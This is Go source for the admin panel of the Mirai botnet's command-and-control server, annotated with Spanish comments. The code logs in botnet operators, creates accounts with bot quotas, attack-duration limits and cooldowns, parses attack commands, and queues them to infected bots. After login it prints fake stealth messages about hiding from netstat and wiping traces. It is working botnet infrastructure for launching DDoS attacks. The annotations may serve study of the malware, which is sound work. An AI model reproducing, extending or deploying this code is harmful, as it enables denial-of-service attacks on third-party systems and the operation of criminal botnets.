// admin.go
/**
 * @file admin.go
 * @brief Implementación de la interfaz de administración del servidor CNC de Mirai
 *
 * Este archivo implementa la lógica para el panel de administración del servidor
 * de Comando y Control (CNC). Maneja la autenticación de administradores,
 * gestión de usuarios y el envío de comandos a los bots conectados.
 */

package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"strconv"
	"strings"
	"time"
)

// Admin representa una sesión de administración activa
type Admin struct {
	conn net.Conn // Conexión de red con el cliente administrativo
}

/**
 * NewAdmin crea una nueva instancia de administración
 *
 * @param conn Conexión de red establecida con el cliente
 * @return Puntero a la nueva instancia de Admin
 */
func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

/**
 * Handle gestiona una sesión de administración completa
 *
 * Este método implementa el flujo completo de una sesión administrativa:
 * 1. Configura la terminal y secuencias de escape
 * 2. Muestra el banner de bienvenida
 * 3. Realiza la autenticación del usuario
 * 4. Proporciona la interfaz de comando interactiva
 * 5. Procesa y ejecuta los comandos del administrador
 *
 * La sesión se mantiene activa hasta que:
 * - El usuario escribe 'exit' o 'quit'
 * - Se produce un error de conexión
 * - Se excede el tiempo de inactividad
 */
func (this *Admin) Handle() {
	// Configura el modo alternativo de buffer de pantalla
	this.conn.Write([]byte("\033[?1049h"))
	// Envía comandos de negociación telnet
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	headerb, err := ioutil.ReadFile("prompt.txt")
	if err != nil {
		return
	}

	header := string(headerb)
	this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))

	// Obtener nombre de usuario
	// Establece timeout de 60 segundos para la entrada
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	// Muestra prompt de usuario con colores ANSI
	this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Obtener contraseña
	// Establece nuevo timeout de 60 segundos para la contraseña
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	// Muestra prompt de contraseña (enmascarada)
	this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
	password, err := this.ReadLine(true) // true = entrada enmascarada
	if err != nil {
		return
	}

	// Establece un timeout más largo para la verificación
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	// Configuración de la animación de carga
	spinBuf := []byte{'-', '\\', '|', '/'} // Caracteres para la animación de spinner
	// Muestra una animación de "verificando cuenta" durante 4.5 segundos
	for i := 0; i < 15; i++ {
		// Muestra el mensaje con el carácter de animación actual
		this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i%len(spinBuf)]))
		// Pausa de 300ms entre cada frame de la animación
		time.Sleep(time.Duration(300) * time.Millisecond)
	}

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
		this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	this.conn.Write([]byte("\r\n\033[0m"))
	this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
	time.Sleep(250 * time.Millisecond)
	this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("[+] DDOS | Hiding from netstat...\r\n"))
	time.Sleep(150 * time.Millisecond)
	this.conn.Write([]byte("[+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
	for i := 0; i < 4; i++ {
		time.Sleep(100 * time.Millisecond)
		this.conn.Write([]byte(fmt.Sprintf("[+] DDOS | Wiping env libc.poison.so.%d\r\n", i+1)))
	}
	this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
	time.Sleep(1 * time.Second)

	// Inicia una goroutine para monitorear y actualizar el contador de bots
	go func() {
		i := 0
		for {
			var BotCount int
			// Calcula el número de bots disponibles respetando el límite del usuario
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots // Limita al máximo permitido
			} else {
				BotCount = clientList.Count() // Usa todos los bots disponibles
			}

			// Espera 1 segundo entre actualizaciones
			time.Sleep(time.Second)
			// Actualiza el título de la terminal con el conteo de bots y nombre de usuario
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots Connected | %s\007", BotCount, username))); err != nil {
				// Si hay error al escribir, cierra la conexión
				this.conn.Close()
				break
			}
			i++
			// Cada 60 segundos renueva el timeout de la conexión
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	this.conn.Write([]byte("\033[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\033[36;1mReady\r\n"))
	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[32;1m" + username + "@botnet# \033[0m"))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		// Ignora líneas vacías
		if cmd == "" {
			continue
		}
		// Por defecto, usa el máximo de bots permitidos para el usuario
		botCount = userInfo.maxBots

		// Comando adduser - Solo disponible para administradores
		if userInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte("Enter new username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Enter new password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("Max attack duration (-1 for none): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("Cooldown time (0 for none): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "botcount" {
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
			}
			continue
		}
		// Procesa el número específico de bots a usar (formato: -N comando)
		if cmd[0] == '-' {
			// Divide el comando en count y comando real
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:] // Extrae el número después del guión
			// Convierte el contador de bots a número
			botCount, err = strconv.Atoi(count)
			if err != nil {
				// Error al parsear el número de bots
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			// Verifica que no exceda el límite del usuario
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
				continue
			}
			// Actualiza el comando sin el prefijo de conteo
			cmd = countSplit[1]
		}
		// Procesa la categoría de bots (solo para administradores)
		if userInfo.admin == 1 && cmd[0] == '@' {
			// Divide el comando en categoría y comando real
			cataSplit := strings.SplitN(cmd, " ", 2)
			// Extrae el nombre de la categoría sin el @
			botCatagory = cataSplit[0][1:]
			// Actualiza el comando sin el prefijo de categoría
			cmd = cataSplit[1]
		}

		// Intenta crear un nuevo ataque con el comando recibido
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			// Error al parsear el comando de ataque
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			// Construye el buffer del ataque para enviar a los bots
			buf, err := atk.Build()
			if err != nil {
				// Error al construir el paquete de ataque
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				// Verifica si el usuario tiene permiso para lanzar el ataque
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					// El usuario no puede lanzar el ataque (cooldown, límites, etc.)
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					// El objetivo no está en la lista blanca, procede con el ataque
					clientList.QueueBuf(buf, botCount, botCatagory)
				} else {
					// El objetivo está protegido por la lista blanca
					fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
				}
			}
		}
	}
}

/**
 * ReadLine lee una línea completa de entrada del usuario
 *
 * Esta función implementa una lectura interactiva de línea con las siguientes características:
 * - Manejo de backspace y eliminación de caracteres
 * - Opción para ocultar la entrada (útil para contraseñas)
 * - Procesamiento de secuencias de escape ANSI
 * - Manejo de caracteres especiales (Ctrl+C, etc.)
 * - Soporte para negociación telnet
 *
 * @param masked Si es true, muestra asteriscos en lugar de los caracteres ingresados
 * @return La línea leída y error en caso de fallo en la lectura
 */
func (this *Admin) ReadLine(masked bool) (string, error) {
	// Buffer para almacenar la línea de entrada
	buf := make([]byte, 1024)
	// Posición actual en el buffer
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
